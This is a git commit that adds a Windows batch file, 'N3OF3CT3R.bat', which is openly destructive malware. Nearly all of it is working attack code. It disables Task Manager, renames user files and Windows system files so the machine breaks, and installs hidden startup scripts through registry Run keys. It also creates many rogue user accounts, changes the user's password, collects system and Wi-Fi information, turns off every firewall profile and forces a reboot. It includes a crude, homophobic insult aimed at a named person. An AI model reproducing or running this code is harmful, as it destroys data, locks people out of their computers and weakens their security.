4a2f35d7df94c253af101e4980fd3002b863faa9
Neo <167165649+neo6942@users.noreply.github.com>
2025-01-16 17:50:50 -0800

    N3OF3CT3R

---
+++ win/N3OF3CT3R.bat
@@ -0,0 +1,252 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCyDJGyX8VAjFBVRQzimM3y0Crod7PvH5umIrAMUV+1f
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSDk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFBVRQzimM3y0Crod7PvHwbmohB4+YLENNorD39Q=
+::YB416Ek+ZW8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+@echo off
+cls
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v DisableTaskMgr /t REG_DWORD /f /d 1
+
+echo.X=MsgBox("N3of3ct3r",0+16,"%random%") >> FakeErrorMsg.vbs
+echo.X=MsgBox("Msg",1+10,"Title") >> FakeErrorMsg1.vbs
+echo.X=MsgBox("Msg",2+32,"Title") >> FakeErrorMsg2.vbs
+echo.X=MsgBox("Msg",3+48,"Title") >> FakeErrorMsg3.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg1.vbs
+start FakeErrorMsg2.vbs
+start FakeErrorMsg3.vbs
+
+
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+type nul > n3of3ct3d%random%.fucked
+
+
+REN *.DOC *.n3of3ct3d%random%
+REN *.JPEG *.n3of3ct3d%random%
+REN *.LNK *.n3of3ct3d%random%
+REN *.AVI *.n3of3ct3d%random%
+REN *.MPEG *.n3of3ct3d%random%
+REN *.COM *.n3of3ct3d%random%
+taskkill /f /im explorer.exe
+
+
+echo DSFDSFDSFDSFDSFDSFDSFDSDS
+echo DJLFDSHFDSLKJLLKJFDSHLKJFDSHLKJHFDSLKJFDSLKJLJHFDS
+echo DSFDSFDSFDSFDSFDSFDSFDSDS
+echo DJLFDSHFDSLKJLLKJFDSHLKJFDSHLKJHFDSLKJFDSLKJLJHFDS
+echo DSFDSFDSFDSFDSFDSFDSFDSDS
+echo DJLFDSHFDSLKJLLKJFDSHLKJFDSHLKJHFDSLKJFDSLKJLJHFDS
+start explorer.exe
+
+echo Set oWMP=CreateObject("WMplayer.OCX.7")>>123.vbs
+echo Set colCDROMs=oWMP.cdromCollection>>123.vbs
+echo do>>123.vbs
+echo if colCDROMs.count>=1 then>>123.vbs
+echo for i=0 to colCDROMs.Count -1>>123.vbs
+echo colCDROMs.Item(i).Eject>>123.vbs
+echo Next>>123.vbs
+echo For i=0 to colCDROMs.Count -1>>123.vbs
+echo colCDROMs.Item(i).Eject>>123.vbs
+echo Next>>123.vbs
+echo End If>>123.vbs
+echo wscript.sleep 5000>>123.vbs
+echo loop>>123.vbs
+echo DO>>1234.vbs
+echo MSGBOX "YOUR COMPUTER HAS BEEN RECYCLED BY N3OF3CT3R!!!!",64,"TEEHEE!!!">>1234.vbs
+echo LOOP>>1234.vbs
+echo @echo off>>f3cter.bat
+echo title Fucked by N3of3ct3r>>f3cter.bat
+echo echo YuhOfficialYT is gay furry trans femboy>>f3cter.bat
+echo pause>>f3cter.bat
+copy /y 123.vbs C:\
+copy /y 1234.vbs C:\
+copy /y f3cter.bat C:\
+attrib +s +h c:\123.vbs
+attrib +s +h c:\1234.vbs
+attrib +s +h c:\f3cter.bat
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\ /v NoClose /t REG_DWORD /f /d 1
+reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\policies\system\ /v legalnoticetext /f /d "F4CK YOU, YUHOFFICIALYT"
+reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\policies\system\ /v legalnoticecaption /f /d "YOUR COMPUT3R HAS B33N FUCK3D BY N3OF3CT3R."
+reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v 123.vbs /d c:\123.vbs
+reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v 1234.vbs /d c:\1234.vbs
+reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v f3cter.bat /d c:\f3cter.bat
+attrib +s +h c:\123.vbs
+attrib +s +h c:\1234.vbs
+attrib +s +h c:\f3cter.bat
+start 123.vbs
+start 1234.vbs
+echo YOUR COMPUT3R HAS B33N FUCK3D BY N3OF3CT3R!>>c:\fuckedbyn3of3ct3r.txt
+echo YOUR COMPUT3R HAS B33N FUCK3D BY N3OF3CT3R!>>d:\fuckedbyn3of3ct3r.txt
+echo YOUR COMPUT3R HAS B33N FUCK3D BY N3OF3CT3R!>>e:\fuckedbyn3of3ct3r.txt
+net user /add %random% %random%n3of3ct3r
+net user /add %random% %random%n3of3ct3r
+net user /add %random% %random%n3of3ct3r
+net user /add %random% %random%n3of3ct3r
+net user /add %random% %random%n3of3ct3r
+net user /add %random% %random%n3of3ct3r
+net user /add %random% %random%n3of3ct3r
+net user /add %random% %random%n3of3ct3r
+net user /add %random% %random%n3of3ct3r
+net user /add %random% %random%n3of3ct3r
+net user /add %random% %random%n3of3ct3r
+net user /add %random% %random%n3of3ct3r
+net user /add %random% %random%n3of3ct3r
+net user /add %random% %random%n3of3ct3r
+net user /add %random% %random%n3of3ct3r
+net user /add %random% %random%n3of3ct3r
+net user /add %random% %random%n3of3ct3r
+net user /add %random% %random%n3of3ct3r
+net user /add %random% %random%n3of3ct3r
+net user /add %random% %random%n3of3ct3r
+net user %username% fuckyou
+nslookup myip.opendns.com resolver1.opendns.com>9K21JM10B.log
+ver>>9K21JM10B.log
+ECHO.>>9K21JM10B.log
+ECHO Username:%username%>>9K21JM10B.log
+ECHO.>>9K21JM10B.log
+ECHO Time: %time%>>9K21JM10B.log
+ECHO.>>9K21JM10B.log
+ECHO Date: %date%>>9K21JM10B.log
+ECHO.>>9K21JM10B.log
+netsh wlan show profiles>>9K21JM10B.log
+ECHO.>>9K21JM10B.log
+ipconfig>>9K21JM10B.log
+ECHO.>>9K21JM10B.log
+ECHO Additional Information:>>9K21JM10B.log
+ipconfig | find /i "IPv4">>9K21JM10B.log
+wmic diskdrive get size>>9K21JM10B.log
+wmic cpu get name>>9K21JM10B.log
+ECHO.>>9K21JM10B.log
+ECHO.>>9K21JM10B.log
+ECHO.>>9K21JM10B.log
+systeminfo>>9K21JM10B.log
+netsh firewall set opmode disable
+netsh firewall set opmode mode=DISABLE
+netsh advfirewall set currentprofile state off
+netsh advfirewall set domainprofile state off
+netsh advfirewall set privateprofile state off
+netsh advfirewall set publicprofile state off
+netsh advfirewall set allprofiles state off
+timeout 2 /NOBREAK >NUL
+echo @echo off>>msg.bat
+echo cd C:\Windows>>msg.bat
+echo REN *.cmd *.sI09>>msg.bat
+echo REN *.exe *.1Je9>>msg.bat
+echo REN *.log *.439a>>msg.bat
+echo REN *.ini *.3KM1>>msg.bat
+echo REN *.dll *.38Jl>>msg.bat
+echo REN *.bin *.3J81>>msg.bat
+echo REN *.txt *.2M1A>>msg.bat
+echo REN *.sys *.8j3J>>msg.bat
+echo REN *.lnk *.9K2M>>msg.bat
+echo REN *.png *.8J2n>>msg.bat
+echo REN *.exe *.3hxD>>msg.bat
+copy /y msg.bat C:\
+attrib +s +h c:\msg.bat
+reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v msg.bat /d c:\msg.bat
+attrib +s +h c:\msg.bat
+shutdown -r -t 10 -c "FUCK YOU HAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHA"
